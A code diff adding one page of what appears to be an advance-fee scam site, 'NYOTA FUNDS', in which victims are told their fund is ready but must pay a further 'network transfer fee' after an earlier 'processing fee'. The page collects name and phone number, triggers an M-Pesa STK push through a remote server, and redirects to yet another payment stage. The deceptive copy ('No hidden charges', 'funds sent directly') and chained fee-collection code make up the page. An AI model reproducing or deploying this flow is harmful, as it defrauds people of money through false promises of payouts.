@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+ <!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '6973a340153840fff105d60b';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>NYOTA FUNDS – Network Transfer Fee</title>
+<link rel="stylesheet" href="style.css"/>
+
+<style>
+.container{max-width:420px;margin:auto;padding:18px}
+.notice{
+  background:#e8f7ee;color:#1b7f4a;
+  padding:14px;border-radius:10px;
+  font-size:15px;margin-bottom:15px
+}
+.info{
+  background:#eef4ff;color:#1f3c88;
+  padding:14px;border-radius:10px;
+  font-size:14px;margin-bottom:15px
+}
+.footer-note{
+  margin-top:14px;
+  font-size:13px;
+  color:#444;
+  line-height:1.5
+}
+
+/* Popup overlay & centered box (fixed center so mobile doesn't crop) */
+#popupOverlay{
+  display:none;position:fixed;inset:0;
+  background:rgba(0,0,0,.6);z-index:999;
+  -webkit-overflow-scrolling:touch;
+}
+#popupBox{
+  background:#fff;width:90%;max-width:360px;
+  padding:20px;border-radius:14px;text-align:center;
+  position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);
+  box-sizing:border-box;
+  box-shadow:0 6px 20px rgba(0,0,0,.25);
+}
+.spinner{
+  border:4px solid #eee;
+  border-top:4px solid #0a6ebd;
+  border-radius:50%;
+  width:30px;height:30px;
+  animation:spin 1s linear infinite;
+  margin:10px auto
+}
+@keyframes spin{100%{transform:rotate(360deg)}}
+
+/* Make OK button look like full-width blue button on mobile */
+#popupBtn{
+  background:#0a6ebd;color:#fff;border:none;padding:12px 18px;
+  border-radius:8px;font-size:16px;margin-top:12px;width:100%;
+  cursor:pointer;
+}
+#popupBtn:active{opacity:0.9}
+input, select, button{
+  font-size:16px;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #ddd;width:100%;box-sizing:border-box;
+}
+button#payBtn{background:#0a6ebd;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer}
+button#payBtn:disabled{opacity:.6;cursor:not-allowed}
+</style>
+</head>
+
+<body>
+
+<script>
+if(!localStorage.getItem("payment1Completed")){
+  window.location.href="payment1.html";
+}
+</script>
+
+<div class="container">
+  <h2>Select Payout Network</h2>
+
+  <!-- TOP INFO -->
+  <div class="info">
+  <strong>
+    Great news <span id="username"></span>, system is now ready to transfer your
+    NYOTA FUNDs!
+  </strong><br><br>
+  Kindly choose where your funds should be transferred to your
+  <strong>preferred network</strong>. Each method has a small fee to
+  cover network charges.
+</div>
+
+  <!-- CONFIRMATION -->
+  <div class="notice">
+    ✅ Processing fee confirmed. Please  choose where you  will receive your Funds, Remember you have to pay cross-network fee to
+    complete your payout.
+  </div>
+
+  <p style="font-size:18px;font-weight:bold;">
+    NYOTA FUND: Ksh <span id="fundAmount">---</span>
+  </p>
+
+  <form id="payment2Form" autocomplete="off" novalidate>
+    <input id="senderName" placeholder="Full Name" required />
+    <input id="senderPhone" placeholder="07XXXXXXXX" inputmode="tel" required />
+
+    <select id="paymentMethod" required>
+      <option value="">-- Choose Network --</option>
+      <option value="mpesa">Safaricom M-Pesa (Ksh 390)</option>
+      <option value="airtel">Airtel Money (Ksh 395)</option>
+      <option value="bank">Bank Account (Ksh 460)</option>
+    </select>
+
+    <p style="margin-top:10px;">
+      <strong>Fee: Ksh <span id="methodFee">---</span></strong>
+    </p>
+
+    <button type="submit" id="payBtn">Pay Network Fee</button>
+  </form>
+
+  <!-- BOTTOM NOTE -->
+  <p class="footer-note">
+    Please make sure your <strong>name</strong> and <strong>phone number</strong>
+    are correct. Before clicking <strong>Pay Now</strong>, your selected fee
+    will be processed and the funds sent directly to your chosen network.
+  </p>
+
+  <p style="font-size:13px;color:gray;margin-top:8px;">
+    🔒 Secure STK push • Instant confirmation • No hidden charges
+  </p>
+</div>
+
+<!-- POPUP -->
+<div id="popupOverlay" aria-hidden="true">
+  <div id="popupBox" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
+    <h3 id="popupTitle" style="margin:0 0 8px 0;font-size:18px;color:#222"></h3>
+    <div id="popupSpinner" aria-hidden="true"></div>
+    <p id="popupMessage" style="font-size:14px;color:#333;margin:10px 0 0 0"></p>
+    <button onclick="popupOk()" id="popupBtn" style="display:none;">OK</button>
+  </div>
+</div>
+
+<script>
+ // ===== LOAD USER NAME FROM LOCAL STORAGE (CAPITAL) =====
+const users = JSON.parse(localStorage.getItem("nyota_users") || "[]");
+const phone = localStorage.getItem("userPhone");
+
+const currentUser = users.find(u => u.phone === phone);
+
+if (currentUser && currentUser.fullname) {
+  const nameEl = document.getElementById("username");
+  if (nameEl) {
+    nameEl.textContent = currentUser.fullname.toUpperCase();
+  }
+}
+/* --- Explicit DOM references --- */
+const payment2Form = document.getElementById('payment2Form');
+const senderName = document.getElementById('senderName');
+const senderPhone = document.getElementById('senderPhone');
+const paymentMethod = document.getElementById('paymentMethod');
+const methodFee = document.getElementById('methodFee');
+const payBtn = document.getElementById('payBtn');
+const fundAmountEl = document.getElementById('fundAmount');
+
+const popupOverlay = document.getElementById('popupOverlay');
+const popupBox = document.getElementById('popupBox');
+const popupTitle = document.getElementById('popupTitle');
+const popupSpinner = document.getElementById('popupSpinner');
+const popupMessage = document.getElementById('popupMessage');
+const popupBtn = document.getElementById('popupBtn');
+
+/* Load selected fund */
+let fund = null;
+try{
+  fund = JSON.parse(localStorage.getItem("selectedFund"));
+} catch(e){
+  fund = null;
+}
+if(!fund || !fund.amount){
+  console.warn("selectedFund missing or invalid — redirecting");
+  window.location.href = "payment1.html";
+} else {
+  fundAmountEl.innerText = fund.amount;
+}
+
+/* Fees */
+const fees = { mpesa:390, airtel:395, bank:460 };
+paymentMethod.addEventListener('change', () => {
+  methodFee.innerText = fees[paymentMethod.value] || '---';
+});
+
+/* Phone formatting */
+function formatPhone(p){
+  if(!p) return null;
+  const d = p.replace(/\D/g,'');
+  if(d.length < 9) return null;
+  if(d.startsWith("07")) return "254"+d.slice(1);
+  if(d.startsWith("7")) return "254"+d;
+  if(d.startsWith("254")) return d;
+  if(d.startsWith("0")) return "254"+d.slice(1);
+  return null;
+}
+
+/* Robust popup */
+function showPopup(title, msg, spin=false, ok=false){
+  if(!popupOverlay || !popupBox) {
+    console.error('Popup elements not found');
+    return;
+  }
+  popupTitle.textContent = title || '';
+  popupMessage.innerHTML = msg || '';
+  popupSpinner.innerHTML = spin ? '<div class="spinner" aria-hidden="true"></div>' : '';
+  popupBtn.style.display = ok ? 'block' : 'none';
+  popupOverlay.style.display = 'block';
+  popupOverlay.setAttribute('aria-hidden', 'false');
+  if(ok) popupBtn.focus();
+}
+function popupOk(){
+  if(popupOverlay){
+    popupOverlay.style.display = 'none';
+    popupOverlay.setAttribute('aria-hidden', 'true');
+  }
+}
+
+/* Submit handler: show "Processing..." first, then update based on server response */
+payment2Form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const nameVal = senderName.value.trim();
+  const phoneVal = formatPhone(senderPhone.value.trim());
+  const method = paymentMethod.value;
+  const amount = fees[method];
+
+  if(!nameVal || !phoneVal || !method){
+    return alert('Please fill all fields correctly');
+  }
+   localStorage.setItem("userPhone", phoneVal);
+  payBtn.disabled = true;
+
+  // 1) Immediately show "Processing" popup (spinner) while we contact server
+  showPopup("Processing...", "Contacting payment server. Please wait.", true, false);
+
+  let data = null;
+  try{
+    const res = await fetch("https://loanserver-a9tc.onrender.com/pay", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ phone: phoneVal, amount, loan_amount: fund.amount })
+    });
+
+    if(!res.ok){
+      // server returned an error status (e.g., 4xx/5xx)
+      throw new Error('Server returned status ' + res.status);
+    }
+
+    data = await res.json();
+  } catch(err){
+    console.error('Payment request failed', err);
+    payBtn.disabled = false;
+    // Replace "Processing..." with a clear failure message and an OK button
+    return showPopup("Payment Failed", "Could not contact payment server. Please try again.", false, true);
+  }
+
+  // 2) Server responded — update popup based on server result
+  // If server confirms it has initiated the STK push, show STK Push Sent message
+  if(data && data.success && data.reference){
+    // Show explicit STK Push Sent popup (spinner kept while awaiting receipt)
+    showPopup(
+      "STK Push Sent 📲",
+      "An STK push has been sent to your phone. Enter your M-Pesa PIN to complete the payment.",
+      true,
+      false
+    );
+
+    // Start polling for receipt / status
+    pollReceipt(data.reference, method, amount);
+  } else {
+    // Server responded but indicated failure — show reason if available
+    payBtn.disabled = false;
+    const reason = (data && data.message) ? data.message : "STK push could not be sent.";
+    showPopup("Payment Failed", reason, false, true);
+  }
+});
+
+/* Polling receipt with safety and error handling */
+function pollReceipt(ref, method, amount){
+  let attempts = 0;
+  const maxAttempts = 60; // ~5 minutes at 5s interval
+  const intervalMs = 5000;
+  const int = setInterval(async () => {
+    attempts++;
+    if(attempts > maxAttempts){
+      clearInterval(int);
+      payBtn.disabled = false;
+      return showPopup("Payment Timeout", "Unable to confirm payment right now. Please check later.", false, true);
+    }
+
+    try{
+      const r = await fetch(`https://loanserver-a9tc.onrender.com/receipt/${encodeURIComponent(ref)}`, { cache: "no-store" });
+      if(!r.ok){
+        console.warn('Receipt fetch not ok', r.status);
+        return;
+      }
+      const d = await r.json();
+      if(!d || !d.receipt || !d.receipt.status) return;
+
+      if(d.receipt.status !== "pending"){
+        clearInterval(int);
+         const status = (d.receipt.status || "").toLowerCase();
+        if (["processing", "success", "completed", "paid"].includes(d.receipt.status)) {
+          try{ localStorage.setItem("payment2Completed", "yes"); }catch(e){}
+          showPopup(
+            "Payment Successful ✅",
+            "Your network fee has been received. Your NYOTA FUND is now pending released.your last stage redirecting.....",
+            false,
+            false
+          );
+          setTimeout(() => window.location.href = "payment3.html", 3500);
+        } else {
+          payBtn.disabled = false;
+          showPopup("Payment Failed", "Payment was cancelled or failed.", false, true);
+        }
+      }
+    } catch(err){
+      console.error('Error polling receipt:', err);
+      // transient error — keep polling
+    }
+  }, intervalMs);
+}
+</script>
+
+</body>
+</html>
